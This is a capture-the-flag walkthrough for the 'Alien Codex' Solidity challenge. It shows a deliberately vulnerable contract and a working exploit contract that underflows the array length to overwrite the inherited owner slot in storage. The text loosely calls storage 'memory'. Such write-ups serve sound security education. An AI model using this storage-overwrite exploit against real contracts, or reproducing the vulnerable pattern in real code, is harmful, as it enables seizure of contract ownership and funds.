# Alien Codex

## Challenge Description

You've uncovered an Alien contract. Claim ownership to complete the level.

 Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./utils/Ownable.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Challenge Solution Walkthrough

We want to become the `owner` of this contract. We can see that there is no `owner` variable in this contract; however, this contract inherited `Ownable` contract which has `_owner` variable, and this variable is in the first slot of the memory. So, we have to change the first slot of the memory to our address.

We can see that the compiler version is `0.5.0` and the `SafeMath` library is not used. So, we are going to use underflow to access the `_owner` variable. To do that, let's find out the memory layout. 

|    Slot Number     |             Variable(s)              |
| :----------------: | :----------------------------------: |
|        `0`         |         `_owner`, `contact`          |
|        `1`         |            `codex.length`            |
|        ...         |                 ...                  |
|   `keccak256(1)`   |              `codex[0]`              |
| `keccak256(1) + 1` |              `codex[1]`              |
|        ...         |                 ...                  |
|   `2 ** 256 - 1`   | `codex[2 ** 256 - 1 - keccak256(1)]` |

Now, if we want to access the first slot, it is the same as accessing the `2 ** 256` slot, because of underflow. We can access the `2 ** 256` slot using `codex[2 ** 256 - 1 - keccak256(1)] + 1`. So, if we set the `codex[2 ** 256 - 1 - keccak256(1)]`, actually we are setting the first slot which contains `_owner`. 

Now, to do that, we write the contract below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienCodexSolution {
    AlienCodex public alienCodex;

    constructor(address alienCodexAddress) public {
        alienCodex = AlienCodex(alienCodexAddress);
    }

    function solveChallenge() public {
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 index = 2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
```

When we call `solveChallenge()` function, firstly, we call `makeContact()` to set the `contact` to `true` to be able to call other functions in the `AlienCodex` contract. Then, we decrease the length of the `codex` array. In the beginning, the length was `0`, so, if we decrease it, it will be `2 ** 256 - 1`. Now, the size of the `codex` is the same as the size of the whole memory, so we have access to the whole memory using `codex`. Then, we have to find the index of owner which is `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1`. Finally, we call `revise()` function to set this index to our own address.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

